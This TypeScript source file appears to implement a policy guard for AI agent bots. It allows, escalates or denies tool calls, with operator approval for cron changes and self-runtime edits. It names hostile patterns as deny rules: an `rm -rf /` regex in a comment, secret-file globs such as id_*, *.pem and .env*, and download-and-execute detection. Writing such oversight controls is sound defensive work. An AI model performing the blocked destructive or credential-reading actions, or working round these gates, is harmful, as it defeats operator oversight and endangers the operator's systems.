// bot's `read` / `fs_grep` / `fs_glob` / `fs_help` / `ls` / `memory_search`
// calls are native tool invocations with no shell command string to parse — so
// they get their own, simpler test: the TOOL NAME is drawn from a small,
// exact-match set that is structurally incapable of a write (no argument shape
// turns `read` into a write; content-mutating tools have their own,
// differently-named tools — write/edit/patch/etc.). This does not weaken any
// existing Layer 1 gate: `read` / `fs_grep` already run through evaluateHard's
// denyReadGlobs check below (READ_TOOLS matches both), so an L1-allow for one
// of these names already means the secret-file floor (*.pem/id_*/*.key/
// *_rsa/*_ed25519/.env*) was checked and passed BEFORE this predicate is ever
// consulted.
//
// FLAGGED ASSUMPTION FOR TESTING: these six names are taken verbatim from
// Mike's own enumeration. Confirm they match the exact `toolName` strings
// openclaw's before_tool_call hook actually delivers (case, underscores, any
// namespacing prefix) before shipping — every audit row already records
// `toolName`, so `grep -h '"toolName"' reviewer-audit.jsonl` on a live bot is
// enough to confirm or correct this set.
const READ_ONLY_TOOL_NAMES = new Set(["read", "fs_grep", "fs_glob", "fs_help", "ls", "memory_search"]);

export function isInertReadOnlyToolCall(toolName: string): boolean {
  return READ_ONLY_TOOL_NAMES.has(toolName);
}

function splitUnquotedStages(cmd: string): string[] {
  const stages: string[] = [];
  let cur = "";
  let quote: '"' | "'" | null = null;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    if (quote === "'") {
      cur += c;
      if (c === "'") quote = null;
      continue;
    }
    if (quote === '"') {
      if (c === "\\" && i + 1 < cmd.length) { cur += c + cmd[i + 1]; i++; continue; }
      cur += c;
      if (c === '"') quote = null;
      continue;
    }
    if (c === "'" || c === '"') { quote = c; cur += c; continue; }
    if (c === "\\" && i + 1 < cmd.length) { cur += c + cmd[i + 1]; i++; continue; }
    if (c === "|" && cmd[i + 1] === "|") { stages.push(cur); cur = ""; i++; continue; }
    if (c === "&" && cmd[i + 1] === "&") { stages.push(cur); cur = ""; i++; continue; }
    if (c === "|" || c === ";") { stages.push(cur); cur = ""; continue; }
    cur += c;
  }
  stages.push(cur);
  // Malformed/unterminated quote — fail closed rather than trust a partial parse.
  if (quote !== null) return ["\0UNTERMINATED_QUOTE"];
  return stages;
}

function leadingArgvToken(stage: string): string {
  const m = stage.trim().match(/^(\S+)/);
  if (!m) return "";
  return (m[1].split("/").pop() ?? m[1]).toLowerCase();
}

// Exported for reviewer.ts: Layer 2 uses the SAME definition of "inert" to
// decide that escalating a read is never the right tightening (CLAW-090).
// Keeping one implementation means the two layers can never drift into
// disagreeing about what a side-effect-free command is.
export function isInertReadOnlyPipeline(cmd: string): boolean {
  const stages = splitUnquotedStages(cmd);
  if (stages.length === 0) return false;
  return stages.every((s) => {
    if (s.trim().length === 0) return false;
    if (READ_ONLY_ARGV_TOOLS.has(leadingArgvToken(s))) return true;
    return isInertGitStage(s);
  });
}

// L2-BACKSTOP-ONLY variant of isInertReadOnlyPipeline above, widened to also
// recognize the read-only docker/aws multiplexer subcommands (see the block
// comment above isInertDockerStage for why this is kept SEPARATE from the
// function evaluateHard/Layer 1 uses, rather than widening that one). Exported
// for reviewer.ts's INERT-READ BACKSTOP only — evaluateHard (Layer 1) never
// calls this; it keeps using the original, narrower isInertReadOnlyPipeline
// above unchanged.
export function isInertReadOnlyPipelineForL2Backstop(cmd: string): boolean {
  const stages = splitUnquotedStages(cmd);
  if (stages.length === 0) return false;
  return stages.every((s) => {
    if (s.trim().length === 0) return false;
    if (READ_ONLY_ARGV_TOOLS.has(leadingArgvToken(s))) return true;
    if (isInertGitStage(s)) return true;
    if (isInertDockerStage(s)) return true;
    return isInertAwsStage(s);
  });
}

/** The exec command for a tool call — same key order evaluateHard uses. */
export function execCommandOf(params: Record<string, unknown> | undefined): string {
  return firstString(params ?? {}, "command", "cmd", "script", "input", "code");
}

// ── Policy file loading + per-bot resolution ──────────────────────────────────

interface PolicyFile {
  botAliases?: Record<string, string>;
  constitution?: {
    fleet?: string[];
    per_bot?: Record<string, string[]>;
  };
  hard?: {
    fleet?: {
      denyReadGlobs?: string[];
      destructiveExec?: Verdict;
      compoundExec?: Verdict;
      substitutionExec?: Verdict;
      gitignoredWrite?: Verdict;
      escalateExecPatterns?: Record<string, string>;
      escalateExecAlways?: Record<string, string>; // fleet-always (no per-bot opt-in)
    };
    per_bot?: Record<
      string,
      {
        // Per-bot override of the fleet destructiveExec verdict. Opt-in: when a
        // bot omits it, the fleet value applies unchanged, so adding this field
        // cannot alter any existing bot's posture.
        //
        // Added for a bot on a corporate-managed host, where the fleet "deny" is wrong
        // for two reasons. First, that host's outer boundary is set by corporate
        // IT and by the Kubernetes pod it runs in, not by us. Second, the fleet
        // pattern `rm\s+-[a-z]*[rf][a-z]*\s+(--no-preserve-root|\/)\b` matches
        // `/` at the START of any absolute path, so it denies an ordinary
        // `rm -rf /work/<repo>/node_modules` — routine in the JavaScript and
        // Electron work she is being given. Denying it would just teach her to
        // route around the rule; escalating it every time would teach Mike to
        // approve without reading. A bot that sets this to "allow" must scope
        // destruction with its own escalateExtra regex (see the VDI overrides).
        destructiveExec?: Verdict;
        allowWriteRoots?: string[];
        escalateWriteRoots?: string[];
        denyWriteOutsideAllow?: boolean;
        escalateActions?: string[];
        escalateExtra?: Record<string, string>;
        // Per-bot HARD DENY regexes — no approval path (see HardPolicy.denyExecRegex).
        // Use escalateExtra when Mike should be asked; use this only when the answer
        // is "no" regardless of who asks.
        denyExtra?: Record<string, string>;
        // Per-bot escalate regexes that must NEVER be auto-allowed unattended
        // (see HardPolicy.consentRequiredExecRegex). "Only with Mike's approval"
        // belongs here; "gate this when convenient" belongs in escalateExtra.
        consentRequiredExtra?: Record<string, string>;
        constitutionalReviewRequired?: boolean;
      }
    >;
  };
}

let cachedPolicy: PolicyFile | null | undefined;

export function loadPolicyFile(path: string): PolicyFile | null {
  if (cachedPolicy !== undefined) return cachedPolicy;
  try {
    cachedPolicy = JSON.parse(readFileSync(path, "utf8")) as PolicyFile;
  } catch {
    cachedPolicy = null;
  }
  return cachedPolicy;
}

/** Normalize OASIS_AGENT_NAME → bot key ("Yes Man" → "yesman"). */
export function botKeyFor(agentName: string, aliases?: Record<string, string>): string {
  if (aliases && aliases[agentName]) return aliases[agentName];
  return agentName.toLowerCase().replace(/[^a-z0-9]+/g, "");
}

/** Constitution principles for a bot = fleet ∪ per_bot. */
export function constitutionFor(policy: PolicyFile | null, botKey: string): string[] {
  const fleet = policy?.constitution?.fleet ?? [];
  const perBot = policy?.constitution?.per_bot?.[botKey] ?? [];
  return [...fleet, ...perBot];
}

export function constitutionalReviewRequired(policy: PolicyFile | null, botKey: string): boolean {
  return policy?.hard?.per_bot?.[botKey]?.constitutionalReviewRequired === true;
}

/**
 * Compile a per-bot regex map, skipping `_`-prefixed documentation keys.
 *
 * These maps are `{name: regexSource}` and EVERY value is compiled, so a prose
 * note stored as a member silently becomes a live rule. That was already latent
 * in kaizen's escalateExtra._note (a harmless escalate that never matches); it
 * would be considerably worse in a denyExtra, where the same mistake creates an
 * un-appealable deny. Author notes belong in a SIBLING `<field>_note` key — this
 * skip makes the convention enforced rather than merely documented.
 *
 * A malformed pattern is skipped rather than thrown, so one bad regex cannot take
 * the whole fleet's policy down with it.
 */
function compileRegexMap(map: Record<string, string> | undefined): RegExp[] {
  const out: RegExp[] = [];
  for (const [key, src] of Object.entries(map ?? {})) {
    if (key.startsWith("_")) continue;
    try {
      out.push(new RegExp(src, "i"));
    } catch {
      /* skip a malformed per-bot pattern rather than fail the whole policy */
    }
  }
  return out;
}

/** Resolve the flat HardPolicy for a bot from the loaded file (fleet + per_bot). */
export function resolveHardPolicy(policy: PolicyFile | null, botKey: string): HardPolicy {
  if (!policy?.hard) return DEFAULT_HARD_POLICY;
  const f = policy.hard.fleet ?? {};
  const b = policy.hard.per_bot?.[botKey] ?? {};
  const patterns = f.escalateExecPatterns ?? {};
  const regex: RegExp[] = [];
  for (const key of b.escalateActions ?? []) {
    const src = patterns[key];
    if (src) regex.push(new RegExp(src, "i"));
  }
  regex.push(...compileRegexMap(b.escalateExtra));
  // HARD DENY regexes. Note the failure direction differs from an escalate: a
  // dropped escalate pattern falls back to a weaker gate, while a dropped DENY
  // pattern removes a floor entirely. Keep these simple and covered by tests.
  const denyRegex = compileRegexMap(b.denyExtra);
  const consentRegex = compileRegexMap(b.consentRequiredExtra);
  // SELF-MODIFICATION backstop (fleet invariant, ALWAYS on — no per-bot opt-in):
  // exec commands that drive the bot's OWN openclaw runtime CLI → escalate. This
  // is the Layer 1 deterministic floor under the constitution's no-self-
  // modification principle, and it is load-bearing the moment a bot runs
  // mode=full (reviewer-gated exec): without an allowlist, `openclaw config set`
  // in a live container would otherwise default-allow and drift the config into a
  // crash. Fleet-wide because "a bot must not rewrite its own runtime" holds for
  // every bot, not just the ones that opted into escalateActions.
  const selfRuntime: RegExp[] = [];
  for (const src of Object.values(f.escalateExecAlways ?? {})) {
    try {
      selfRuntime.push(new RegExp(src, "i"));
    } catch {
      /* skip a malformed fleet pattern rather than fail the whole policy */
    }
  }
  return {
    denyReadGlobs: f.denyReadGlobs ?? DEFAULT_HARD_POLICY.denyReadGlobs,
    denyWriteRoots: DEFAULT_HARD_POLICY.denyWriteRoots,
    gitignoredWrite: f.gitignoredWrite ?? "escalate",
    compoundExec: f.compoundExec ?? "escalate",
    substitutionExec: f.substitutionExec ?? "escalate",
    destructiveExec: b.destructiveExec ?? f.destructiveExec ?? "deny",
    allowWriteRoots: b.allowWriteRoots ?? [],
    escalateWriteRoots: b.escalateWriteRoots ?? [],
    denyWriteOutsideAllow: b.denyWriteOutsideAllow === true,
    denyExecRegex: denyRegex,
    consentRequiredExecRegex: consentRegex,
    escalateExecRegex: regex,
    selfRuntimeExecRegex: selfRuntime,
  };
}

// ── Path helpers ──────────────────────────────────────────────────────────────

function basename(p: string): string {
  const i = p.replace(/\/+$/, "").lastIndexOf("/");
  return i >= 0 ? p.slice(i + 1) : p;
}
function globMatch(glob: string, name: string): boolean {
  if (glob.startsWith("*") && glob.endsWith("*") && glob.length > 1) return name.includes(glob.slice(1, -1));
  if (glob.startsWith("*")) return name.endsWith(glob.slice(1));
  if (glob.endsWith("*")) return name.startsWith(glob.slice(0, -1));
  return name === glob;
}
function underRoot(absPath: string, root: string): boolean {
  const a = absPath.replace(/\/+$/, "");
  const r = root.replace(/\/+$/, "");
  return a === r || a.startsWith(r + "/");
}
/** Resolve a possibly-relative path against a cwd hint (RELATIVE PATHS principle). */
export function resolveTarget(p: string, cwd: string | undefined): string {
  if (!p) return p;
  if (isAbsolute(p)) return p;
  return resolvePath(cwd && isAbsolute(cwd) ? cwd : "/", p);
}

export function isGitignored(absPath: string): boolean {
  try {
    let cwd = dirname(absPath);
    while (cwd !== "/" && cwd !== "." && !existsSync(cwd)) cwd = dirname(cwd);
    execFileSync("git", ["-C", cwd, "check-ignore", "--quiet", "--", absPath], { stdio: "ignore", timeout: 3000 });
    return true;
  } catch (err) {
    return (err as { status?: number }).status === 0;
  }
}

const READ_TOOLS = /read|fetch|dir|list|cat|stat|grep/i;
const WRITE_TOOLS = /write|edit|patch|create|append|mkdir|mv|cp|rm|delete/i;

function firstString(o: Record<string, unknown>, ...keys: string[]): string {
  for (const k of keys) {
    const v = o[k];
    if (typeof v === "string" && v.length > 0) return v;
  }
  return "";
}

export interface EvalInput {
  family: "exec" | "file" | "web" | "other";
  toolName: string;
  params: Record<string, unknown> | undefined;
  derivedPaths: readonly string[] | undefined;
}

export function evaluateHard(input: EvalInput, policy: HardPolicy = DEFAULT_HARD_POLICY): Decision {
  const params = input.params ?? {};
  const cwd = firstString(params, "cwd", "workingDir", "dir") || undefined;

  // ── Cron authoring is the consent point (CLAW-078) ──
  // Gate MUTATIONS of the schedule itself (add/update/remove on openclaw's native
  // `cron` tool). Reviewing at authoring time is what lets an unattended RUN skip
  // per-call approval: Mike approves what will run, once, while he is present.
  // Checked before the family dispatch because `cron` classifies as "other".
  if (input.toolName === "cron") {
    const action = firstString(params, "action").toLowerCase();
    if (CRON_MUTATE_ACTIONS.has(action)) {
      return {
        verdict: "escalate",
        principle: "hard:cron-mutation",
        reason: `cron ${action} changes what runs unattended later — needs Mike's approval`,
      };
    }
    return ALLOW; // status | list | runs | run | wake
  }

  if (input.family === "exec") {
    const cmd = firstString(params, "command", "cmd", "script", "input", "code");
    if (cmd) {
      const destructiveCheckCmd = stripSafeScratchRm(cmd);
      for (const re of DESTRUCTIVE) {
        if (re.test(destructiveCheckCmd)) {
          // "allow" means this rule ABSTAINS, not "stop evaluating". Returning
          // early on allow would short-circuit the escalate patterns below and
          // hand the bot an unconditional pass on `rm -rf /`, which is the exact
          // opposite of what a bot opting out of the blanket deny wants. A bot
          // that sets destructiveExec="allow" is saying "scope this by path with
          // my own escalateExtra regexes" — so fall through and let them decide.
          // deny and escalate still return immediately, so no existing bot's
          // behaviour changes.
          if (policy.destructiveExec !== "allow") {
            return { verdict: policy.destructiveExec, principle: "hard:destructive-exec", reason: `refusing destructive command: ${cmd.slice(0, 120)}` };
          }
          break;
        }
      }
      if (DOWNLOAD_EXEC.test(cmd)) return { verdict: "deny", principle: "hard:download-execute", reason: `refusing pipe/decode into a shell (obfuscated RCE): ${cmd.slice(0, 120)}` };
      // denyExtra / consentRequiredExtra / escalateExtra are naive substring
      // regexes over the whole raw command — they cannot tell a trade/transfer
      // word used as a verb on a real target apart from the same word appearing
      // as DATA inside a read-only text tool's own search pattern (see the
      // READ_ONLY_ARGV_TOOLS comment above `isInertReadOnlyPipeline`). Computed
      // once; only skips those three per-bot loops, never DESTRUCTIVE/DOWNLOAD_EXEC
      // (already evaluated above) or SUBSTITUTION (still evaluated below).
      const inertReadOnly = isInertReadOnlyPipeline(cmd);
      // Per-bot hard floor. Deliberately ahead of BOTH escalate loops below: an
      // overlapping escalate pattern must not be able to open an approval path
      // around a rule whose whole point is that approval does not apply.
      if (!inertReadOnly) {
        for (const re of policy.denyExecRegex) {
          if (re.test(cmd)) return { verdict: "deny", principle: "hard:bot-forbidden-action", reason: `forbidden for this bot — no approval path: ${cmd.slice(0, 120)}` };
        }
      }
      // CLAW-104: a purely read-only self-inspection is not "driving" the
      // runtime — it only prints state. Computed once, ahead of the loop, so the
      // carve-out applies to every authored self-runtime pattern rather than
      // depending on which one happens to match first.
      const readOnlySelfRuntime = isReadOnlySelfRuntimeCommand(cmd);
      for (const re of policy.selfRuntimeExecRegex) {
        if (re.test(cmd)) {
          if (readOnlySelfRuntime) break;
          return { verdict: "escalate", principle: "hard:self-runtime", reason: `driving this bot's own openclaw runtime needs Mike's approval: ${cmd.slice(0, 120)}` };
        }
      }
      if (!inertReadOnly) {
        for (const re of policy.consentRequiredExecRegex) {
          if (re.test(cmd)) return { verdict: "escalate", principle: "hard:operator-consent-required", reason: `needs Mike's explicit approval and is never auto-allowed unattended: ${cmd.slice(0, 120)}` };
        }
        for (const re of policy.escalateExecRegex) {
          if (re.test(cmd)) return { verdict: "escalate", principle: "hard:operator-consent-action", reason: `action needs Mike's slash-command approval: ${cmd.slice(0, 120)}` };
        }
      }
      if (SUBSTITUTION.test(cmd) && !hasOnlySafeSubstitution(cmd)) return { verdict: policy.substitutionExec, principle: "hard:command-substitution", reason: `command/process substitution routed to human: ${cmd.slice(0, 120)}` };
      if (BENIGN_COMPOUND.test(cmd)) return { verdict: policy.compoundExec, principle: "hard:compound-exec", reason: `compound/redirect: ${cmd.slice(0, 120)}` };
    }
    return ALLOW;
  }

  if (input.family === "file") {
    const rawPaths =
      input.derivedPaths && input.derivedPaths.length > 0
        ? [...input.derivedPaths]
        : [firstString(params, "path", "file", "filePath", "file_path", "target")].filter(Boolean);
    const paths = rawPaths.map((p) => resolveTarget(p, cwd));

    const isWrite = WRITE_TOOLS.test(input.toolName) || "content" in params || "text" in params;
    const isRead = !isWrite && READ_TOOLS.test(input.toolName);

    for (const p of paths) {
      if (isWrite) {
        for (const root of policy.denyWriteRoots) {
          if (underRoot(p, root)) return { verdict: "deny", principle: "hard:deny-write-control-plane", reason: `write to control-plane path denied: ${p}` };
        }
        // Write-scoping applies to MIKE's real filesystem (/reach/*) only. A bot's
        // own container-private dirs — /home/node/.openclaw (memory + workspace),
        // /report, /tmp, its work volumes — are always its to write: the rootfs is
        // read-only and the control-plane deny above already fences oasis-claw, so
        // nothing sensitive lives outside /reach to protect. WITHOUT this gate, a
        // scoped bot whose allowWriteRoots only names /reach paths would have its OWN
        // memory writes denied as "out of scope" — the enforce brick that stops a bot
        // from functioning at all (CLAW-074 companion-reach rollout).
        if (policy.denyWriteOutsideAllow && policy.allowWriteRoots.length > 0 && underRoot(p, "/reach")) {
          const inScope = policy.allowWriteRoots.some((r) => underRoot(p, r));
          if (!inScope) return { verdict: "deny", principle: "hard:write-out-of-scope", reason: `write outside this bot's allowed roots (${policy.allowWriteRoots.join(", ")}) denied: ${p}` };
        }
        for (const root of policy.escalateWriteRoots) {
          if (underRoot(p, root)) return { verdict: "escalate", principle: "hard:escalate-write-root", reason: `write to a slash-approval-gated path: ${p}` };
        }
        if (isGitignored(p)) return { verdict: policy.gitignoredWrite, principle: "hard:gitignored-write", reason: `write to a .gitignored path: ${p}` };
      }
      if (isRead) {
        const name = basename(p);
        for (const g of policy.denyReadGlobs) {
          if (globMatch(g, name)) return { verdict: "deny", principle: "hard:deny-read-secret", reason: `read of a protected file denied: ${p}` };
        }
      }
    }
    return ALLOW;
  }

  return ALLOW;
}
